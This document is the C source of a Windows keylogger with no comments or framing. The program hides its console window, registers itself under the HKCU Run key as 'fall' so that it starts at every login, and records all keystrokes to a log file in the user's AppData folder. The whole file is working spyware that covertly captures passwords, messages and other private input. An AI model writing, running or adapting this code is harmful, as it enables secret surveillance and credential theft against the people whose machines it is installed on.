#include <windows.h>
#include <stdio.h>

#define LOG_FILE "C:\\Users\\%USERNAME%\\AppData\\Roaming\\log.txt"
#define EXE_NAME "C:\\Users\\%USERNAME%\\AppData\\Roaming\\fall_logger.exe"

void AddToStartup() {
    char path[MAX_PATH];
    ExpandEnvironmentStringsA(EXE_NAME, path, MAX_PATH);

    HKEY hKey = NULL;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {

        RegSetValueExA(hKey, "fall", 0, REG_SZ, (BYTE*)path, strlen(path) + 1);
        RegCloseKey(hKey);
    }
}

void LogKey(int key) {
    char fullpath[MAX_PATH];
    ExpandEnvironmentStringsA(LOG_FILE, fullpath, MAX_PATH);

    FILE *file = fopen(fullpath, "a+");
    if (file == NULL) return;

    if (key >= 0x20 && key <= 0x7E)
        fprintf(file, "%c", key);
    else
        fprintf(file, "[%d]", key);

    fclose(file);
}

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    AddToStartup();

    while (1) {
        for (int key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) & 1) {
                LogKey(key);
            }
        }
        Sleep(10);
    }

    return 0;
}
